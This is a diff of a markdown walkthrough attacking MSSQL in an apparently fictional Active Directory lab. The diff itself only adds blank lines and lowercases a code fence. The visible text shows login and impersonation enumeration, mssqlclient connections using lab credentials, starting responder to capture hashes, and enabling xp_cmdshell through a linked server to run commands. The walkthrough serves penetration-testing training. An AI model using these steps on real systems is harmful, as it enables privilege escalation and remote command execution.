@@ -115,11 +115,13 @@ python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/samwell.tarly:Hea
 - I added some new entries to the database : enum_db/enum_links/enum_impersonate/enum_login/enum_owner/exec_as_user/exec_as_login/use_link/show_query/mask_query
 
 - Let's start the enumeration :
+
 ```
 enum_logins
 ```
 
 - This launch the following query (roles value meaning can be show [here](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-transact-sql?view=sql-server-ver16))
+
 ```sql
 select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, 
 sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin 
@@ -135,11 +137,13 @@ where r.type in ('S','E','X','U','G')
 ### impersonate - execute as login
 
 - Let's enumerate impersonation values:
+
 ```
 enum_impersonate
 ```
 
 - This launch the following queries:
+
 ```sql
 SELECT 'LOGIN' as 'execute as','' AS 'database', 
 pe.permission_name, pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' 
@@ -209,6 +213,7 @@ enum_logins
 - As we can see with sa login we see a lot more things. And we can see that jon.snow is sysadmin on the mssql server
 
 - Let's see if there is others impersonation privileges:
+
 ```
 enum_impersonate
 ```
@@ -221,6 +226,7 @@ enum_impersonate
 ### impersonate - execute as user
 
 - We launch a connection to the db as arya.stark :
+
 ```bash
 python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local
 ```
@@ -254,6 +260,7 @@ exec master..xp_cmdshell 'whoami'
  - start responder `responder -I vboxnet0`
 
 - Connect with hodor (0 privilèges)
+
 ```bash
 python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/hodor:hodor@castelblack.north.sevenkingdoms.local
 ```
@@ -305,7 +312,7 @@ xp_cmdshell whoami
 
 - This play the following MSSQL commands :
 
-```SQL
+```sql
 EXEC ('select system_user as "username"') AT BRAAVOS
 EXEC ('exec master.dbo.sp_configure ''show advanced options'',1;RECONFIGURE;exec master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE;') AT BRAAVOS
 EXEC ('exec master..xp_cmdshell ''whoami''') AT BRAAVOS
